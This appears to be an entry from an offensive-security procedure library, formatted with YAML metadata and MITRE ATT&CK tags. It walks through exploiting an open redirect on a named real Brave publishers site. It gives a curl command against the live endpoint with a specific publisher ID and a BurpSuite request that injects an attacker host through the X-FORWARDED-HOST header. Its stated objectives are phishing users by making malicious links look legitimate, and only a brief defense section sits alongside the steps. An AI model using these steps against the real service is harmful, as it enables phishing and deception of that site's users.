---
tags:
  - open-redirect
  - phishing
  - header-injection
type: procedure
tools:
  - '[[tools/BurpSuite]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-trigger-redirect]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:24:26.180Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: f81a2caa-b124-4b95-abb9-e20b2283e237
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Trigger-and-Manipulate-Open-Redirect-in-Expired-Auth-Token

## Summary

This procedure exploits an open redirect vulnerability in the Brave Software publishers.basicattentiontoken.org application by triggering a 302 redirect via the expired_auth_token endpoint and manipulating the X-FORWARDED-HOST header to redirect users to arbitrary external sites, enabling phishing attacks where malicious links mimic legitimate ones.

## Description

The vulnerability stems from the application's trust in the user-controlled X-FORWARDED-HOST header without proper validation when constructing redirect URLs. By intercepting the request triggered with a specific publisher_id (e.g., 587fb66a-9fdb-4419-9d05-f38ce41666ca), an attacker can inject a custom host, causing the server to redirect to an attacker-controlled domain. This is particularly effective for phishing as it leverages the trust in the Brave domain. The target environment is a web application accessible over HTTPS, requiring no authentication for the endpoint.

## Requirements

1. Network access to https://publishers.basicattentiontoken.org/
2. BurpSuite or similar proxy for request interception and modification
3. A valid publisher_id (e.g., from public reports or enumeration)
4. Control over an external domain for redirection testing

## Defense

Defensive measures and detection strategies:

- Validate and sanitize the X-FORWARDED-HOST header against a whitelist of trusted domains
- Implement redirect confirmation pages or strict URL validation to prevent arbitrary redirects
- Monitor for anomalous 302 responses and header manipulations in web application firewalls (WAF)
- Use Content Security Policy (CSP) to restrict navigation to untrusted domains

## Objectives

1. Redirect users from the legitimate Brave domain to a phishing site
2. Bypass any implicit trust in internal redirects
3. Facilitate social engineering by making phishing links appear authentic

## Instructions

### Step 1: Trigger the Redirect

**Context**: Access the expired_auth_token endpoint to initiate the vulnerable 302 redirect, which will be intercepted in the next step.

**Command** ([[commands/curl-trigger-redirect]]):
```bash
curl -i "https://publishers.basicattentiontoken.org/publishers/expired_auth_token?publisher_id=587fb66a-9fdb-4419-9d05-f38ce41666ca"
```

> This command sends a GET request to the endpoint, returning a 302 response with a Location header. The output should show HTTP/1.1 302 Found and a redirect URL. Success is indicated by the 302 status.

### Step 2: Intercept and Inject Custom Header

**Context**: Use a proxy tool to capture the request and modify the X-FORWARDED-HOST header to point to an attacker-controlled domain, exploiting the lack of validation.

**Instructions**: Configure BurpSuite Proxy to intercept traffic. Replay the request from Step 1, adding the header `X-FORWARDED-HOST: injectedurl.com`. Forward the request and observe the new redirect Location.

> No direct command, but in BurpSuite Repeater, the modified request looks like:
>
> ```http
> GET /publishers/expired_auth_token?publisher_id=587fb66a-9fdb-4419-9d05-f38ce41666ca HTTP/1.1
> Host: publishers.basicattentiontoken.org
> X-FORWARDED-HOST: injectedurl.com
> ```
>
> Expected output: 302 redirect to http://injectedurl.com/somepath. Verify by following the redirect manually.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-trigger-redirect]]

## Tools Used

- [[tools/BurpSuite]]

## Tags

- open-redirect
- header-injection
- phishing
